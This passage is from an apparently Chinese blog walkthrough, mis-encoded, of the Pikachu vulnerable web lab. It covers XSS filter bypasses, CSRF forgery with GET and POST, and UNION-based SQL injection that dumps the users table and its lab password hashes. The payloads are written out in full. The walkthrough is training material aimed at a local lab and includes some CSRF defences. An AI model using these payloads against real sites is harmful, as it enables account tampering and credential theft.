çš„ä¼¤å¿ƒå¾€äº‹&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;dom&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;       </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œä¸å‰è¾¹çš„åŸºæœ¬ä¸€æ ·ã€‚ã€‚æ²¡ä»€ä¹ˆè¿‡æ»¤ã€‚å¯ä»¥ç»§ç»­ä½¿ç”¨ä¸Šä¸€ä¸ªçš„payload</p>
<h2 id="XSSä¹‹ç›²æ‰“"><a href="#XSSä¹‹ç›²æ‰“" class="headerlink" title="XSSä¹‹ç›²æ‰“"></a>XSSä¹‹ç›²æ‰“</h2><p><img src="https://img.vim-cn.com/d7/516c1722d0ca48ceb34a328db75e26af5a9bf6.png"></p>
<p>ç°åœ¨ä¸¤ä¸ªæ¡†é‡Œéƒ½å°è¯•è¾“å…¥ä¸€äº›</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åç‚¹å‡»æäº¤ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿï¼Œè¿™æ—¶å€™æˆ‘ä»¬ç™»é™†åå°çœ‹çœ‹ï¼ˆå³ä¸Šè§’æœ‰æç¤º</p>
<p>ç”¨æˆ·åå¯†ç ä¸ä¹‹å‰çš„ä¸€æ ·</p>
<p>ç™»é™†ä¹‹åå¯çœ‹åˆ°å¼¹çª—</p>
<h2 id="XSSä¹‹è¿‡æ»¤"><a href="#XSSä¹‹è¿‡æ»¤" class="headerlink" title="XSSä¹‹è¿‡æ»¤"></a>XSSä¹‹è¿‡æ»¤</h2><p><img src="https://img.vim-cn.com/a1/e4a14a9d8da6bf71646fe2ec990d4f46bb2f8b.png"></p>
<p>è¾“å…¥<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>æµ‹è¯•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿”å›ï¼šåˆ«è¯´è¿™äº›&#39;&gt;&#39;çš„è¯,ä¸è¦æ€•,å°±æ˜¯å¹²!</span><br></pre></td></tr></table></figure>

<p>å°è¯•å¤§å°å†™ç»•è¿‡æ£€æµ‹<code>&lt;ScriPT&gt;alert(&#39;xss&#39;)&lt;/ScriPT&gt;</code></p>
<h2 id="XSSä¹‹htmlspecialchars"><a href="#XSSä¹‹htmlspecialchars" class="headerlink" title="XSSä¹‹htmlspecialchars"></a>XSSä¹‹htmlspecialchars</h2><p><img src="https://img.vim-cn.com/c1/db094c6ab94a2fd34ed92b5777a75bf7b01439.png"></p>
<p>å®¡æŸ¥å…ƒç´ å¯ä»¥å‘ç°ï¼Œè¿™æ˜¯å°†è¾“å…¥çš„å†…å®¹è½¬åˆ°äº†aæ ‡ç­¾é‡Œä½œä¸ºhrefçš„å€¼ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/06/f22454f2d5c7b98c81f4369d6d3377a82382aa.png"></p>
<p>è€Œä¸”è¿˜å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»¤hrefçš„å€¼ä¸ºç©ºå¹¶ä¸”æ·»åŠ ä¸€ä¸ªonclickäº‹ä»¶ï¼ˆä¹Ÿå¯ä»¥æ˜¯onmouseoverç­‰ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#39; onclick&#x3D;&#39;alert(123)&#39;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åç‚¹å‡»ç”Ÿæˆçš„é“¾æ¥å³å¯è§¦å‘äº‹ä»¶å®ç°å¼¹çª—</p>
<h2 id="XSSä¹‹hrefè¾“å‡º"><a href="#XSSä¹‹hrefè¾“å‡º" class="headerlink" title="XSSä¹‹hrefè¾“å‡º"></a>XSSä¹‹hrefè¾“å‡º</h2><p><img src="https://img.vim-cn.com/82/a0bb2386276e9146153cb681dc97271ef9af8b.png"></p>
<p>æµ‹è¯•å‘ç°è¾“å…¥127.0.0.1æˆ–è€…è¾“å…¥å€¼ä¸ºç©ºçš„è¯ä¼šè¿”å›ä¸€ä¸ªé“¾æ¥</p>
<p><img src="https://img.vim-cn.com/ef/201163c6166686531846759a8db1905cae2fc8.png"></p>
<p>å°è¯•åˆ©ç”¨å¼•å·æ¥é—­åˆåˆ©ç”¨äº‹ä»¶æ¥è§¦å‘ï¼Œå‘ç°å¼•å·è¢«è½¬ä¹‰äº†ã€‚é‚£å°±åˆ©ç”¨Javascriptä¼ªåè®®æ¥å®ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1);</span><br></pre></td></tr></table></figure>

<p>ä¹‹åç‚¹å‡»é“¾æ¥å³å¯è§¦å‘å¼¹çª—</p>
<h3 id="å…³äºjavascriptä¼ªåè®®ï¼š"><a href="#å…³äºjavascriptä¼ªåè®®ï¼š" class="headerlink" title="å…³äºjavascriptä¼ªåè®®ï¼š"></a>å…³äºjavascriptä¼ªåè®®ï¼š</h3><p>è¿™ä¸ªåè®®å£°æ˜äº†URLçš„ä¸»ä½“æ˜¯ä»»æ„çš„javascriptä»£ç ï¼Œå®ƒç”±javascriptçš„è§£é‡Šå™¨è¿è¡Œã€‚è‹¥javascript:URLä¸­çš„javascriptä»£ç å«æœ‰å¤šä¸ªè¯­å¥ï¼Œå¿…é¡»ä½¿ç”¨åˆ†å·å°†è¿™äº›è¯­å¥åˆ†éš”å¼€ã€‚</p>
<p><code>&lt;a&gt;</code>æ ‡ç­¾å®šä¹‰è¶…é“¾æ¥ï¼Œç”¨äºä»ä¸€ä¸ªé¡µé¢é“¾æ¥åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œæœ€é‡è¦çš„å±æ€§æ˜¯ href å±æ€§ï¼Œå®ƒæŒ‡å®šé“¾æ¥çš„ç›®æ ‡ã€‚</p>
<h2 id="XSSä¹‹jsè¾“å‡º"><a href="#XSSä¹‹jsè¾“å‡º" class="headerlink" title="XSSä¹‹jsè¾“å‡º"></a>XSSä¹‹jsè¾“å‡º</h2><p><img src="https://img.vim-cn.com/73/aae0865e6e1c1d2e50961a7ac46b2f1e9db7b0.png"></p>
<p>å¯ä»¥å‘ç°<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­æœ‰å‡ è¡Œä»£ç ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    $ms&#x3D;&#39;123&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$msçš„å€¼å³ä¸ºè¾“å…¥å€¼</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé—­åˆ<code>&lt;script&gt;</code>æ ‡ç­¾å®ç°å¼¹çª—<code>&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<p>ä¹Ÿå¯ç”¨å¼•å·é—­åˆä¸€ä¸‹ä¹‹åç›´æ¥åŠ ä¸€æ®µ<code>alert(&#39;xss&#39;)</code>å³å¯payloadï¼š<code>&#39;;alert(&#39;xss&#39;);//</code> .<code>//</code>æ˜¯ä¸ºäº†æ³¨é‡Šæ‰åŸæœ‰çš„å¼•å·å’Œåˆ†å·. </p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>â€‹        åœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»ä¹Ÿå°±å®Œæˆäº†ï¼Œæ‰€ä»¥CSRFæ”»å‡»ä¹Ÿè¢«ç§°ä¸ºâ€one clickâ€æ”»å‡»</p>
<h3 id="æ¢æµ‹"><a href="#æ¢æµ‹" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h3><p>â€‹        åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œï¼ˆå¢åˆ æ”¹ï¼‰æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ </p>
<p>1ã€å¯¹ç›®æ ‡ç½‘ç«™å¢åˆ æ”¹çš„åœ°æ–¹è¿›è¡Œæ ‡è®°ï¼Œå¹¶è§‚å¯Ÿå…¶é€»è¾‘ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«ä¼ªé€ ï¼›</p>
<p>ã€€â€“æ¯”å¦‚ä¿®æ”¹ç®¡ç†å‘˜è´¦å·ï¼Œå¹¶ä¸éœ€è¦éªŒè¯æ—§å¯†ç ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ </p>
<p>ã€€â€“æ¯”å¦‚å¯¹äºæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å¹¶æ²¡æœ‰ä½¿ç”¨å®‰å…¨çš„tokenéªŒè¯ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ </p>
<p>2ã€ç¡®è®¤å‡­è¯çš„æœ‰æ•ˆæœŸï¼ˆè¿™ä¸ªé—®é¢˜ä¼šæé«˜CSRFè¢«åˆ©ç”¨çš„æ¦‚ç‡ï¼‰</p>
<p>ã€€â€“è™½ç„¶æ¨å‡ºæˆ–è€…å…³é—­äº†æµè§ˆå™¨ï¼Œä½†æ˜¯cookieä»ç„¶æœ‰æ•ˆï¼Œæˆ–è€…sessionå¹¶æ²¡æœ‰åŠæ—¶è¿‡æœŸï¼Œå¯¼è‡´CSRFæ”»å‡»å˜å¾—ç®€å•</p>
<h3 id="ä¸XSSåŒºåˆ«"><a href="#ä¸XSSåŒºåˆ«" class="headerlink" title="ä¸XSSåŒºåˆ«"></a>ä¸XSSåŒºåˆ«</h3><p>â€‹        CSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´å</p>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF( get )"></a>CSRF( get )</h2><p>ç‚¹å‡»å³ä¸Šè§’çš„æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡ ä¸ªè´¦å·ï¼Œç™»é™†åå¯ä»¥çœ‹åˆ°ä¸ªäººä¿¡æ¯</p>
<p><img src="https://img.vim-cn.com/69/2b33696b5316b18fee8a7103c882650015f574.png"></p>
<p>å°è¯•ä¿®æ”¹ä¸€ä¸‹ä¸ªäººä¿¡æ¯</p>
<p><img src="https://img.vim-cn.com/ff/a516c0b7a7ef5bb2662ff899e6fcf57998968e.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;kobe@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ ¹æ®urlçš„æ„é€ ï¼Œè¿›è¡Œä¼ªé€ å¹¶ä¸”è¯±éª—ç”¨æˆ·ç‚¹å‡»å³å¯å®ç°csrfæ”»å‡»ï¼Œä¾‹å¦‚ æ„é€ ä¸€ä¸ªä¿®æ”¹é‚®ç®±çš„url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;123456@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>è‹¥ç”¨æˆ·åœ¨ç™»é™†çŠ¶æ€ä¸‹ç‚¹å‡»urlåˆ™ä¿¡æ¯ä¼šè¢«ä¿®æ”¹</p>
<p><img src="https://img.vim-cn.com/21/55d81aea8c3a68d1a6fc98ff167ace9c1a8c69.png"></p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF( post )"></a>CSRF( post )</h2><p>ä»¥postæ–¹å¼è¿›è¡Œæäº¤è¯·æ±‚çš„è¯å°±æ— æ³•é€šè¿‡åƒgetæ–¹å¼é‚£æ ·ä¼ªé€ urlå®ç°æ”»å‡»ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç«™ç‚¹ï¼Œå°†POSTè¯·æ±‚éšè—åœ¨ç«™ç‚¹ä¸­çš„è¡¨å•ä¸­ï¼Œç„¶åè¯±éª—ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œå½“ç”¨æˆ·ç‚¹å‡»åè§¦å‘è¡¨å•ï¼Œæ•°æ®è‡ªç„¶å°±POSTåˆ°å­˜åœ¨CSRFæ¼æ´çš„ç½‘ç«™ï¼Œç”¨æˆ·çš„ä¿¡æ¯åˆ™è¢«æ¶æ„ä¿®æ”¹</p>
<p>æ¼”ç¤º ä½¿ç”¨bpå®ç°</p>
<p>ä¿®æ”¹ä¸€ä¸‹ï¼Œåœ¨bpä¸­æ‰¾åˆ°åˆšåˆšæäº¤çš„poståŒ…ï¼ˆè®°å¾—ä¸è¦æ‹¦æˆª</p>
<p><img src="https://img.vim-cn.com/b0/1bbec1a4b044c6ea9f99ef04bb9d2abb04957d.png"></p>
<p>å°†è¿™ä¸ªåŒ…ä¼ åˆ° <code>Generate CSRF PoC</code></p>
<p><img src="https://img.vim-cn.com/d3/ed8d56634813dff72dd0484fc5ed90d724a3b9.png"></p>
<p>ä¿®æ”¹æ•°æ®ï¼Œå¹¶ç”Ÿæˆurl æ“ä½œå¦‚ä¸‹ğŸ‘‡ï¼ˆä¹Ÿå¯ç‚¹copy htmlï¼Œä¿®æ”¹å†…å®¹åæ”¾å…¥å¯¹åº”ç«™ç‚¹ä¸‹å³å¯</p>
<p><img src="https://img.vim-cn.com/e7/86d713c5e8c8d6a4b176c51f5d766d3aadae6e.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;burpsuite&#x2F;show&#x2F;3&#x2F;2mahwy0tx746tboun3j4psftikhddv9v</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e7/9aecbd2f450842585d87f898722f1453660ae9.png"></p>
<p>ç‚¹å‡»æäº¤è¯·æ±‚ï¼Œå³å¯å‘ç°ä¿¡æ¯ä¿®æ”¹æˆåŠŸ</p>
<p><img src="https://img.vim-cn.com/c9/e43996934fc28e7b70f6be86bc26245fed14dc.png"></p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF( Token )"></a>CSRF( Token )</h2><p>åŸç†ï¼šä¸»è¦é—®é¢˜æ˜¯æ•æ„Ÿæ“ä½œçš„é“¾æ¥å®¹æ˜“è¢«ä¼ªé€ ã€‚è€Œåªè¦åœ¨æ¯æ¬¡è¯·æ±‚æ—¶éƒ½å¢åŠ ä¸€ä¸ªéšæœºç <code>Token</code>ï¼Œåå°æ¯æ¬¡éƒ½å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯ï¼Œåˆ™å¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢CSRF</p>
<p>åœ¨æºç ä¸­å¯ä»¥å‘ç°ğŸ‘‡</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;per_info&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,&#123;$name&#125;,æ¬¢è¿æ¥åˆ°ä¸ªäººä¼šå‘˜ä¸­å¿ƒ | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;token_get.php?logout=1&quot;</span>&gt;</span>é€€å‡ºç™»å½•<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>å§“å:&#123;$name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_sex&quot;</span>&gt;</span>æ€§åˆ«:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$sex&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_phone&quot;</span>&gt;</span>æ‰‹æœº:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$phonenum&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_add&quot;</span>&gt;</span>ä½å€:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$add&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_email&quot;</span>&gt;</span>é‚®ç®±:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$email&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$_SESSION[&#x27;token&#x27;]&#125;&quot;</span> /&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œéƒ½ä¼šåˆ·æ–°<code>token</code>ï¼Œä¼šæŠŠ<code>SESSION</code>ä¸­<code>token</code>é”€æ¯ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªæ–°çš„<code>token</code>ï¼Œå¹¶å°†è¿™ä¸ª<code>token</code>ä¼ åˆ°å‰ç«¯è¡¨å•ä¸­ï¼Œæ¯æ¬¡æäº¤è¡¨å•æ—¶ï¼Œè¿™ä¸ª<code>token</code>å€¼å°±ä¼šä¼ åˆ°åå°ä¸<code>SESSION</code>ä¸­çš„<code>token</code>è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ä¸ç›¸ç­‰ï¼Œæ­¤æ¬¡è¡¨å•åˆ™æäº¤å¤±è´¥ã€‚æ‰€ä»¥é»‘å®¢ç”±äºä¸èƒ½å¾—çŸ¥ç”¨æˆ·å½“å‰çš„<code>token</code>å€¼ï¼Œä»è€Œæ— æ³•è¿›è¡ŒCSRFæ”»å‡»</p>
<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h3><ol>
<li>å¢åŠ éªŒè¯ç </li>
<li>è¿›è¡Œè¾ƒä¸ºå®‰å…¨çš„ä¼šè¯ç®¡ç†ï¼Œè®¾ç½®ä¼šè¯è¿‡æœŸæ—¶é•¿</li>
<li>è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼Œå¦‚è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒäºŒæ¬¡è®¤è¯</li>
</ol>
<h1 id="Sql-Inject-SQLæ³¨å…¥"><a href="#Sql-Inject-SQLæ³¨å…¥" class="headerlink" title="Sql Inject(SQLæ³¨å…¥)"></a>Sql Inject(SQLæ³¨å…¥)</h1><h2 id="æ•°å­—å‹æ³¨å…¥-post"><a href="#æ•°å­—å‹æ³¨å…¥-post" class="headerlink" title="æ•°å­—å‹æ³¨å…¥( post )"></a>æ•°å­—å‹æ³¨å…¥( post )</h2><p><img src="https://img-blog.csdnimg.cn/20210201132535206.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªPOSTä¼ å‚å½¢å¼<br>æ‰€ä»¥ç›´æ¥ç”¨burpsuiteæŠ“åŒ…æ¥è¿›è¡Œsqlæ³¨å…¥</p>
<p><img src="https://img-blog.csdnimg.cn/20210201151706459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">ctrl+rå‘é€åˆ°Repeateré‡Œ<br>ä¿®æ”¹idçš„å€¼è¿›è¡Œæ³¨å…¥</p>
<p>çˆ†å­—æ®µ<br><img src="https://img-blog.csdnimg.cn/20210201152002801.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥çœ‹æ•°æ®åº“å<br><img src="https://img-blog.csdnimg.cn/20210201152122654.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥çœ‹è¯¥æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152305126.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†usersè¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152443306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">è·å–usernameå’Œpasswordæ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select username,password from users%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152607769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å¯¹åº”è´¦å·å’ŒMD5åŠ å¯†çš„å¯†ç ï¼š<br>adminï¼še10adc3949ba59abbe56e057f20f883eï¼ˆ123456ï¼‰<br>pikachuï¼š670b14728ad9902aecba32e22fa4f6bdï¼ˆ000000ï¼‰<br>testï¼še99a18c428cb38d5f260853678922e03ï¼ˆabc123ï¼‰</p>
<h2 id="å­—ç¬¦å‹æ³¨å…¥-get"><a href="#å­—ç¬¦å‹æ³¨å…¥-get" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥( get )"></a>å­—ç¬¦å‹æ³¨å…¥( get )</h2><p><img src="https://img-blog.csdnimg.cn/20210201152935585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å’Œä¸Šä¸€ä¸ªç±»ä¼¼ï¼Œåªä¸è¿‡è¿™ä¸ªæ˜¯å­—ç¬¦å‹çš„ï¼Œéœ€è¦åŠ ä¸Šä¸€ä¸ªå•å¼•å· (â€˜) æ¥é—­åˆ</p>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#39; order by 2#</span><br><span class="line"></span><br><span class="line">a&#39; order by 3#</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªå­—æ®µ<br><img src="https://img-blog.csdnimg.cn/2021020115325520.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€æŸ¥æ•°æ®åº“åå’Œç‰ˆæœ¬å·</p>
